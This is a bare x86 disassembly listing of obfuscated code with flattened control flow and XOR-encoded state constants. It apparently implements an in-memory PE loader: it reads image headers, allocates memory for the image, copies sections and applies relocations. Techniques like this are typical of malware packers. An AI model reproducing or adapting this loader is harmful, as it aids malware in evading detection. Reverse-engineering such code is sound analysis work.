  426f85:	mov    edx,DWORD PTR [esi]
  426f87:	xor    ecx,edi
  426f89:	add    ecx,ebx
  426f8b:	cmp    edx,ecx
  426f8d:	je     0x427436
  426f93:	mov    ecx,DWORD PTR [ebp+0x1c]
  426f96:	mov    DWORD PTR [ebp-0x1c],eax
  426f99:	mov    DWORD PTR [ebp+0x1c],ecx
  426f9c:	mov    ecx,DWORD PTR [ebp+0x18]
  426f9f:	mov    eax,DWORD PTR [esi]
  426fa1:	mov    DWORD PTR [ebp-0x20],eax
  426fa4:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  426fab:	mov    edx,0xf89c85b1
  426fb0:	mov    DWORD PTR [ebp-0x8],edx
  426fb3:	mov    eax,DWORD PTR [ebp+0x1c]
  426fb6:	mov    DWORD PTR [ebp+0x1c],eax
  426fb9:	mov    eax,DWORD PTR [ebp+0x1c]
  426fbc:	mov    eax,DWORD PTR [eax+0x190]
  426fc2:	mov    eax,DWORD PTR [eax]
  426fc4:	mov    DWORD PTR [ebp-0x24],ecx
  426fc7:	mov    ecx,DWORD PTR [ebp+0x1c]
  426fca:	mov    ecx,DWORD PTR [ecx+0x190]
  426fd0:	mov    ecx,DWORD PTR [ecx]
  426fd2:	add    ecx,DWORD PTR [eax+0x3c]
  426fd5:	mov    DWORD PTR [ebp+0x10],ecx
  426fd8:	mov    eax,DWORD PTR [ebp+0x8]
  426fdb:	xor    eax,edi
  426fdd:	add    eax,ebx
  426fdf:	mov    DWORD PTR [ebp-0x4],eax
  426fe2:	mov    eax,DWORD PTR [ebp+0x8]
  426fe5:	xor    eax,edi
  426fe7:	add    eax,ebx
  426fe9:	mov    DWORD PTR [ebp+0x18],eax
  426fec:	mov    eax,DWORD PTR [ebp+0x10]
  426fef:	mov    eax,DWORD PTR [eax+0x50]
  426ff2:	sub    eax,0xc
  426ff5:	mov    DWORD PTR [ebp-0x28],eax
  426ff8:	mov    eax,DWORD PTR [ebp+0x10]
  426ffb:	mov    eax,DWORD PTR [eax+0x38]
  426ffe:	mov    ecx,DWORD PTR [ebp+0x10]
  427001:	dec    eax
  427002:	test   DWORD PTR [ecx+0x54],eax
  427005:	mov    eax,DWORD PTR [ebp+0x10]
  427008:	je     0x427022
  42700a:	mov    eax,DWORD PTR [eax+0x38]
  42700d:	mov    ecx,DWORD PTR [ebp+0x10]
  427010:	mov    ecx,DWORD PTR [ecx+0x54]
  427013:	dec    eax
  427014:	not    eax
  427016:	and    ecx,eax
  427018:	mov    eax,DWORD PTR [ebp+0x10]
  42701b:	mov    eax,DWORD PTR [eax+0x38]
  42701e:	add    eax,ecx
  427020:	jmp    0x427025
  427022:	mov    eax,DWORD PTR [eax+0x54]
  427025:	mov    DWORD PTR [ebp+0x1c],eax
  427028:	mov    eax,DWORD PTR [ebp+0x8]
  42702b:	xor    eax,edi
  42702d:	add    eax,ebx
  42702f:	mov    DWORD PTR [ebp+0x18],eax
  427032:	mov    eax,DWORD PTR [ebp+0x8]
  427035:	xor    eax,edi
  427037:	add    eax,ebx
  427039:	mov    DWORD PTR [ebp+0x18],eax
  42703c:	mov    eax,DWORD PTR [ebp+0x8]
  42703f:	mov    ecx,DWORD PTR [ebp-0x24]
  427042:	xor    eax,edi
  427044:	add    eax,ebx
  427046:	mov    DWORD PTR [ecx],eax
  427048:	mov    DWORD PTR [ebp+0x18],edx
  42704b:	mov    DWORD PTR [ebp+0x18],0xf89c85b2
  427052:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  427059:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  427060:	mov    eax,DWORD PTR [ebp-0x8]
  427063:	mov    ecx,DWORD PTR [ebp+0x1c]
  427066:	xor    eax,edi
  427068:	add    eax,ebx
  42706a:	imul   eax,ecx
  42706d:	mov    ecx,DWORD PTR [ebp+0x8]
  427070:	mov    edx,DWORD PTR [ebp-0x28]
  427073:	xor    ecx,edi
  427075:	lea    ecx,[ecx+edx*1+0x3272ec]
  42707c:	cmp    eax,ecx
  42707e:	jae    0x42742f
  427084:	mov    eax,DWORD PTR [ebp+0x8]
  427087:	xor    eax,edi
  427089:	add    eax,ebx
  42708b:	mov    DWORD PTR [ebp+0x18],eax
  42708e:	mov    eax,DWORD PTR [ebp+0x1c]
  427091:	add    eax,DWORD PTR [ebp-0x1c]
  427094:	mov    DWORD PTR [ebp-0x4],eax
  427097:	push   DWORD PTR [ebp-0x4]
  42709a:	mov    esi,DWORD PTR [ebp-0x1c]
  42709d:	mov    ecx,DWORD PTR [ebp+0x10]
  4270a0:	call   0x4261ef
  4270a5:	mov    DWORD PTR [ebp+0xc],eax
  4270a8:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4270af:	mov    eax,DWORD PTR [ebp-0x18]
  4270b2:	xor    eax,edi
  4270b4:	lea    ecx,[ebp-0x40]
  4270b7:	add    eax,ebx
  4270b9:	push   ecx
  4270ba:	call   0x426783
  4270bf:	mov    eax,DWORD PTR [ebp+0xc]
  4270c2:	test   eax,eax
  4270c4:	je     0x427114
  4270c6:	mov    eax,DWORD PTR [ebp-0x18]
  4270c9:	xor    eax,edi
  4270cb:	add    eax,ebx
  4270cd:	push   eax
  4270ce:	push   DWORD PTR [ebp+0xc]
  4270d1:	lea    eax,[ebp-0x40]
  4270d4:	push   eax
  4270d5:	call   0x426679
  4270da:	mov    eax,DWORD PTR [ebp-0x4]
  4270dd:	mov    DWORD PTR [ebp-0x18],eax
  4270e0:	mov    eax,DWORD PTR [ebp-0x18]
  4270e3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270e6:	sub    eax,ecx
  4270e8:	mov    DWORD PTR [ebp-0x18],eax
  4270eb:	mov    eax,DWORD PTR [ebp+0xc]
  4270ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4270f1:	mov    eax,DWORD PTR [eax+0x10]
  4270f4:	add    eax,DWORD PTR [ecx+0xc]
  4270f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4270fa:	cmp    ecx,eax
  4270fc:	jb     0x427114
  4270fe:	mov    eax,DWORD PTR [ebp+0xc]
  427101:	mov    eax,DWORD PTR [eax+0xc]
  427104:	mov    ecx,DWORD PTR [ebp+0xc]
  427107:	add    eax,DWORD PTR [ecx+0x8]
  42710a:	mov    ecx,DWORD PTR [ebp-0x18]
  42710d:	sub    eax,ecx
  42710f:	jmp    0x427402
  427114:	push   0xc
  427116:	push   DWORD PTR [ebp-0x4]
  427119:	lea    eax,[ebp-0x4c]
  42711c:	push   eax
  42711d:	call   0x426679
  427122:	mov    eax,0xf89c85b0
  427127:	mov    DWORD PTR [ebp-0x2c],eax
  42712a:	mov    DWORD PTR [ebp-0x30],0xf89c85b1
  427131:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  427138:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  42713f:	lea    ecx,[ebp-0x2c]
  427142:	mov    DWORD PTR [ebp-0xc],ecx
  427145:	lea    ecx,[ebp-0x30]
  427148:	mov    DWORD PTR [ebp-0x10],ecx
  42714b:	lea    ecx,[ebp-0x34]
  42714e:	mov    DWORD PTR [ebp+0xc],ecx
  427151:	lea    ecx,[ebp-0x38]
  427154:	mov    DWORD PTR [ebp-0x14],ecx
  427157:	mov    ecx,DWORD PTR [ebp+0x8]
  42715a:	xor    ecx,edi
  42715c:	add    ecx,ebx
  42715e:	mov    DWORD PTR [ebp-0x18],ecx
  427161:	jmp    0x42735d
  427166:	cmp    eax,0xf89c85b2
  42716b:	je     0x42736f
  427171:	mov    ecx,DWORD PTR [ebp-0x8]
  427174:	xor    ecx,edi
  427176:	mov    esi,eax
  427178:	add    ecx,ebx
  42717a:	mov    DWORD PTR [ebp+0x18],ecx
  42717d:	mov    eax,DWORD PTR [ebp-0x18]
  427180:	xor    esi,edi
  427182:	lea    eax,[eax+esi*1+0x3272ec]
  427189:	mov    DWORD PTR [ebp-0x18],eax
  42718c:	mov    eax,DWORD PTR [ebp-0x8]
  42718f:	mov    ecx,DWORD PTR [ebp-0x18]
  427192:	xor    eax,edi
  427194:	add    eax,ebx
  427196:	cmp    ecx,eax
  427198:	jne    0x4271ad
  42719a:	mov    eax,DWORD PTR [ebp+0x8]
  42719d:	xor    eax,edi
  42719f:	add    eax,ebx
  4271a1:	push   eax
  4271a2:	push   0xc
  4271a4:	lea    eax,[ebp-0x4c]
  4271a7:	push   eax
  4271a8:	call   0x426c5f
  4271ad:	mov    eax,DWORD PTR [ebp-0xc]
  4271b0:	mov    eax,DWORD PTR [eax]
  4271b2:	xor    eax,edi
  4271b4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4271be:	xor    ecx,edi
  4271c0:	movzx  eax,al
  4271c3:	add    ecx,ebx
  4271c5:	cmp    eax,ecx
  4271c7:	je     0x427345
  4271cd:	mov    eax,DWORD PTR [ebp-0x10]
  4271d0:	mov    eax,DWORD PTR [eax]
  4271d2:	xor    eax,edi
  4271d4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271db:	mov    ecx,DWORD PTR [ebp+0x8]
  4271de:	xor    ecx,edi
  4271e0:	movzx  eax,al
  4271e3:	add    ecx,ebx
  4271e5:	cmp    eax,ecx
  4271e7:	je     0x427345
  4271ed:	mov    eax,DWORD PTR [ebp+0xc]
  4271f0:	mov    eax,DWORD PTR [eax]
  4271f2:	xor    eax,edi
  4271f4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271fb:	mov    ecx,DWORD PTR [ebp+0x8]
  4271fe:	xor    ecx,edi
  427200:	movzx  eax,al
  427203:	add    ecx,ebx
  427205:	cmp    eax,ecx
  427207:	je     0x427345
  42720d:	mov    eax,DWORD PTR [ebp-0x14]
  427210:	mov    eax,DWORD PTR [eax]
  427212:	xor    eax,edi
  427214:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42721b:	mov    ecx,DWORD PTR [ebp+0x8]
  42721e:	xor    ecx,edi
  427220:	movzx  eax,al
  427223:	add    ecx,ebx
  427225:	cmp    eax,ecx
  427227:	je     0x427345
  42722d:	mov    eax,DWORD PTR [ebp-0x10]
  427230:	mov    eax,DWORD PTR [eax]
  427232:	xor    eax,edi
  427234:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42723b:	mov    ecx,DWORD PTR [ebp-0xc]
  42723e:	mov    ecx,DWORD PTR [ecx]
  427240:	xor    ecx,edi
  427242:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427249:	xor    al,cl
  42724b:	mov    ecx,DWORD PTR [ebp+0xc]
  42724e:	mov    ecx,DWORD PTR [ecx]
  427250:	xor    ecx,edi
  427252:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427259:	or     al,cl
  42725b:	mov    ecx,DWORD PTR [ebp-0xc]
  42725e:	mov    ecx,DWORD PTR [ecx]
  427260:	xor    ecx,edi
  427262:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427269:	cmp    cl,al
  42726b:	jne    0x427345
  427271:	mov    eax,DWORD PTR [ebp+0xc]
  427274:	mov    eax,DWORD PTR [eax]
  427276:	xor    eax,edi
  427278:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42727f:	mov    ecx,DWORD PTR [ebp-0x10]
  427282:	mov    ecx,DWORD PTR [ecx]
  427284:	xor    ecx,edi
  427286:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42728d:	xor    al,cl
  42728f:	mov    ecx,DWORD PTR [ebp-0x14]
  427292:	mov    ecx,DWORD PTR [ecx]
  427294:	xor    ecx,edi
  427296:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42729d:	or     al,cl
  42729f:	mov    ecx,DWORD PTR [ebp-0x10]
  4272a2:	mov    ecx,DWORD PTR [ecx]
  4272a4:	xor    ecx,edi
  4272a6:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4272ad:	cmp    cl,al
  4272af:	jne    0x427345
  4272b5:	mov    eax,DWORD PTR [ebp-0x14]
  4272b8:	mov    eax,DWORD PTR [eax]
  4272ba:	xor    eax,edi
  4272bc:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4272c6:	mov    ecx,DWORD PTR [ecx]
  4272c8:	xor    ecx,edi
  4272ca:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4272d1:	xor    al,cl
  4272d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4272d6:	mov    ecx,DWORD PTR [ecx]
  4272d8:	xor    ecx,edi
  4272da:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4272e1:	or     al,cl
  4272e3:	mov    ecx,DWORD PTR [ebp+0xc]
  4272e6:	mov    ecx,DWORD PTR [ecx]
  4272e8:	xor    ecx,edi
  4272ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4272f1:	cmp    cl,al
  4272f3:	jne    0x427345
  4272f5:	mov    eax,DWORD PTR [ebp-0x14]
  4272f8:	mov    eax,DWORD PTR [eax]
  4272fa:	xor    eax,edi
  4272fc:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  427303:	mov    ecx,DWORD PTR [ebp-0xc]
  427306:	mov    ecx,DWORD PTR [ecx]
  427308:	xor    ecx,edi
  42730a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427311:	xor    al,cl
  427313:	mov    ecx,DWORD PTR [ebp-0x10]
  427316:	mov    ecx,DWORD PTR [ecx]
  427318:	xor    ecx,edi
  42731a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427321:	or     al,cl
  427323:	mov    ecx,DWORD PTR [ebp-0x14]
  427326:	mov    ecx,DWORD PTR [ecx]
  427328:	xor    ecx,edi
  42732a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427331:	cmp    cl,al
  427333:	jne    0x427345
  427335:	lea    eax,[ebp-0x4c]
  427338:	push   eax
  427339:	call   0x426e00
  42733e:	mov    ecx,DWORD PTR [ebp-0x44]
  427341:	cmp    eax,ecx
  427343:	je     0x42734f
  427345:	mov    eax,DWORD PTR [ebp+0x8]
  427348:	xor    eax,edi
  42734a:	add    eax,ebx
  42734c:	mov    DWORD PTR [ebp+0x18],eax
  42734f:	mov    eax,DWORD PTR [ebp-0x8]
  427352:	xor    eax,edi
  427354:	lea    eax,[eax+esi*1+0x3272ec]
  42735b:	xor    eax,edi
  42735d:	mov    ecx,DWORD PTR [ebp+0x8]
  427360:	mov    edx,DWORD PTR [ebp+0x18]
  427363:	xor    ecx,edi
  427365:	add    ecx,ebx
  427367:	cmp    edx,ecx
  427369:	je     0x427166
  42736f:	mov    eax,DWORD PTR [ebp+0x8]
  427372:	mov    ecx,DWORD PTR [ebp+0x18]
  427375:	xor    eax,edi
  427377:	add    eax,ebx
  427379:	cmp    ecx,eax
  42737b:	jne    0x42738e
  42737d:	mov    eax,DWORD PTR [ebp-0x8]
  427380:	mov    ecx,DWORD PTR [ebp+0x1c]
  427383:	xor    eax,edi
  427385:	lea    eax,[eax+ecx*1+0x3272ec]
  42738c:	jmp    0x427405
  42738e:	push   0x18
  427390:	push   DWORD PTR [ebp-0x4]
  427393:	lea    eax,[ebp-0x64]
  427396:	push   eax
  427397:	call   0x426679
  42739c:	mov    eax,DWORD PTR [ebp+0x8]
  42739f:	mov    ecx,DWORD PTR [ebp-0x18]
  4273a2:	xor    eax,edi
  4273a4:	add    eax,ebx
  4273a6:	cmp    eax,ecx
  4273a8:	je     0x4273bd
  4273aa:	mov    eax,DWORD PTR [ebp+0x8]
  4273ad:	xor    eax,edi
  4273af:	add    eax,ebx
  4273b1:	push   eax
  4273b2:	push   0x18
  4273b4:	lea    eax,[ebp-0x64]
  4273b7:	push   eax
  4273b8:	call   0x426c5f
  4273bd:	mov    eax,DWORD PTR [ebp-0x4]
  4273c0:	add    eax,0x18
  4273c3:	mov    DWORD PTR [ebp+0x18],eax
  4273c6:	push   DWORD PTR [ebp-0x50]
  4273c9:	push   DWORD PTR [ebp+0x18]
  4273cc:	mov    eax,DWORD PTR [ebp-0x54]
  4273cf:	add    eax,DWORD PTR [ebp-0x20]
  4273d2:	push   eax
  4273d3:	call   0x426679
  4273d8:	mov    eax,DWORD PTR [ebp+0x8]
  4273db:	mov    ecx,DWORD PTR [ebp-0x18]
  4273de:	xor    eax,edi
  4273e0:	add    eax,ebx
  4273e2:	cmp    eax,ecx
  4273e4:	je     0x4273f7
  4273e6:	push   0x0
  4273e8:	push   DWORD PTR [ebp-0x50]
  4273eb:	mov    eax,DWORD PTR [ebp-0x54]
  4273ee:	add    eax,DWORD PTR [ebp-0x20]
  4273f1:	push   eax
  4273f2:	call   0x426c5f
  4273f7:	mov    eax,DWORD PTR [ebp-0x24]
  4273fa:	mov    ecx,DWORD PTR [ebp-0x50]
  4273fd:	add    DWORD PTR [eax],ecx
  4273ff:	mov    eax,DWORD PTR [ebp-0x50]
  427402:	add    eax,DWORD PTR [ebp+0x1c]
  427405:	mov    DWORD PTR [ebp+0x1c],eax
  427408:	mov    eax,DWORD PTR [ebp-0x8]
  42740b:	mov    ecx,DWORD PTR [ebp+0x1c]
  42740e:	xor    eax,edi
  427410:	add    eax,ebx
  427412:	imul   eax,ecx
  427415:	mov    ecx,DWORD PTR [ebp+0x8]
  427418:	mov    edx,DWORD PTR [ebp-0x28]
  42741b:	xor    ecx,edi
  42741d:	lea    ecx,[ecx+edx*1+0x3272ec]
  427424:	cmp    eax,ecx
  427426:	jb     0x427084
  42742c:	mov    esi,DWORD PTR [ebp+0x14]
  42742f:	mov    eax,DWORD PTR [ebp-0x20]
  427432:	mov    DWORD PTR [esi],eax
  427434:	jmp    0x42747b
  427436:	mov    ecx,DWORD PTR [ebp+0x8]
  427439:	mov    edx,DWORD PTR [ebp+0xc]
  42743c:	xor    ecx,edi
  42743e:	xor    edx,edi
  427440:	add    ecx,ebx
  427442:	add    edx,ebx
  427444:	cmp    ecx,edx
  427446:	jne    0x42745a
  427448:	mov    eax,ds:0x7f642ddf
  42744d:	imul   eax,eax,0x9f15fcce
  427453:	mov    ds:0x7f642ddf,eax
  427458:	jmp    0x42747b
  42745a:	mov    ecx,DWORD PTR [ebp+0x8]
  42745d:	xor    ecx,edi
  42745f:	add    ecx,ebx
  427461:	cmp    eax,ecx
  427463:	je     0x427471
  427465:	sub    DWORD PTR ds:0xf861e3f,0x709beac1
  42746f:	jmp    0x42747b
  427471:	and    DWORD PTR ds:0x3343fadf,0x5265ec3e
  42747b:	pop    edi
  42747c:	pop    esi
  42747d:	pop    ebx
  42747e:	leave  
  42747f:	ret    0x18
  427482:	push   ebp
  427483:	mov    ebp,esp
  427485:	and    esp,0xfffffff8
  427488:	mov    eax,DWORD PTR [ebp+0x20]
  42748b:	sub    esp,0x14
  42748e:	push   ebx
  42748f:	mov    ebx,DWORD PTR [ebp+0x14]
  427492:	push   esi
  427493:	push   edi
  427494:	cmp    eax,0xf89c85b0
  427499:	jne    0x4274a5
  42749b:	push   0xf89c85b1
  4274a0:	jmp    0x4275d7
  4274a5:	mov    eax,DWORD PTR [ebp+0x20]
  4274a8:	cmp    eax,0xf89c85b1
  4274ad:	jne    0x4274b9
  4274af:	push   0xf89c85b2
  4274b4:	jmp    0x4275d7
  4274b9:	mov    eax,DWORD PTR [ebp+0x20]
  4274bc:	cmp    eax,0xf89c85b2
  4274c1:	jne    0x4274cd
  4274c3:	push   0xf89c85b3
  4274c8:	jmp    0x4275d7
  4274cd:	mov    eax,DWORD PTR [ebp+0x20]
  4274d0:	cmp    eax,0xf89c85b3
  4274d5:	jne    0x4274e1
  4274d7:	push   0xf89c85bc
  4274dc:	jmp    0x4275d7
  4274e1:	mov    ecx,DWORD PTR [ebp+0x20]
  4274e4:	mov    eax,0xf89c85bf
  4274e9:	cmp    ecx,eax
  4274eb:	jne    0x4275a7
  4274f1:	mov    eax,DWORD PTR [ebp+0x10]
  4274f4:	mov    DWORD PTR [esp+0xc],eax
  4274f8:	mov    eax,DWORD PTR [ebp+0x18]
  4274fb:	mov    DWORD PTR [esp+0x14],eax
  4274ff:	mov    eax,DWORD PTR [ebp+0xc]
  427502:	mov    DWORD PTR [esp+0x18],eax
  427506:	mov    eax,DWORD PTR [ebp+0x8]
  427509:	mov    DWORD PTR [esp+0x10],eax
  42750d:	mov    eax,DWORD PTR [esp+0x10]
  427511:	mov    ecx,DWORD PTR [esp+0x14]
  427515:	mov    edi,0x75108a4
  42751a:	xor    eax,edi
  42751c:	mov    esi,0x3272ec
  427521:	add    eax,esi
  427523:	mov    DWORD PTR [ecx],eax
  427525:	mov    eax,DWORD PTR [esp+0xc]
  427529:	mov    eax,DWORD PTR [eax+0x194]
  42752f:	mov    ecx,DWORD PTR [eax]
  427531:	mov    eax,DWORD PTR [esp+0xc]
  427535:	mov    eax,DWORD PTR [eax+0x194]
  42753b:	mov    eax,DWORD PTR [eax]
  42753d:	add    eax,DWORD PTR [ecx+0x3c]
  427540:	mov    ecx,DWORD PTR [esp+0xc]
  427544:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42754a:	mov    ecx,DWORD PTR [ecx+0x14]
  42754d:	push   0x4
  42754f:	push   0x3000
  427554:	push   DWORD PTR [eax+0x50]
  427557:	push   0x0
  427559:	call   ecx
  42755b:	mov    DWORD PTR [ebx],eax
  42755d:	mov    eax,DWORD PTR [esp+0x10]
  427561:	push   DWORD PTR [esp+0xc]
  427565:	xor    eax,edi
  427567:	add    eax,esi
  427569:	mov    DWORD PTR [esp+0x20],eax
  42756d:	lea    eax,[esp+0x20]
  427571:	push   eax
  427572:	push   ebx
  427573:	push   DWORD PTR [esp+0x20]
  427577:	push   DWORD PTR [esp+0x28]
  42757b:	push   DWORD PTR [esp+0x24]
  42757f:	call   0x426f44
  427584:	mov    eax,DWORD PTR [esp+0x10]
  427588:	mov    ecx,DWORD PTR [ebx]
  42758a:	xor    eax,edi
  42758c:	add    eax,esi
  42758e:	cmp    ecx,eax
  427590:	je     0x4275ee
  427592:	mov    eax,DWORD PTR [esp+0x18]
  427596:	mov    ecx,DWORD PTR [esp+0x14]
  42759a:	xor    eax,edi
  42759c:	add    eax,esi
  42759e:	imul   eax,DWORD PTR [esp+0x1c]
  4275a3:	mov    DWORD PTR [ecx],eax
  4275a5:	jmp    0x4275ee
  4275a7:	mov    ecx,DWORD PTR [ebp+0x20]
  4275aa:	cmp    ecx,0xf89c85bc
  4275b0:	jne    0x4275b9
  4275b2:	push   0xf89c85bd
  4275b7:	jmp    0x4275d7
  4275b9:	mov    ecx,DWORD PTR [ebp+0x20]
  4275bc:	cmp    ecx,0xf89c85bd
  4275c2:	jne    0x4275cb
  4275c4:	push   0xf89c85be
  4275c9:	jmp    0x4275d7
  4275cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4275ce:	cmp    ecx,0xf89c85be
  4275d4:	jne    0x4275ee
  4275d6:	push   eax
  4275d7:	push   DWORD PTR [ebp+0x1c]
  4275da:	push   DWORD PTR [ebp+0x18]
  4275dd:	push   ebx
  4275de:	push   DWORD PTR [ebp+0x10]
  4275e1:	push   DWORD PTR [ebp+0xc]
  4275e4:	push   DWORD PTR [ebp+0x8]
  4275e7:	call   0x427482
  4275ec:	mov    DWORD PTR [ebx],eax
  4275ee:	mov    eax,DWORD PTR [ebx]
  4275f0:	pop    edi
  4275f1:	pop    esi
  4275f2:	pop    ebx
  4275f3:	mov    esp,ebp
  4275f5:	pop    ebp
  4275f6:	ret    0x1c
  4275f9:	push   ebp
  4275fa:	mov    ebp,esp
  4275fc:	sub    esp,0xc
  4275ff:	mov    eax,0xf89c85b0
  427604:	mov    DWORD PTR [ebp-0x8],eax
  427607:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  42760e:	mov    ecx,DWORD PTR [ebp-0x8]
  427611:	xor    ecx,0x75108a4
  427617:	add    ecx,0x3272ec
  42761d:	mov    DWORD PTR [ebp-0x4],ecx
  427620:	mov    ecx,DWORD PTR [ebp+0xc]
  427623:	push   eax
  427624:	mov    DWORD PTR [ebp+0xc],ecx
  427627:	push   DWORD PTR [ebp+0xc]
  42762a:	lea    eax,[ebp-0x4]
  42762d:	push   DWORD PTR [ebp+0x8]
  427630:	push   eax
  427631:	push   DWORD PTR [ebp+0xc]
  427634:	push   DWORD PTR [ebp-0xc]
  427637:	push   DWORD PTR [ebp-0x8]
  42763a:	call   0x427482
  42763f:	mov    DWORD PTR [ebp-0x4],eax
  427642:	mov    eax,DWORD PTR [ebp-0x4]
  427645:	leave  
  427646:	ret    0x8
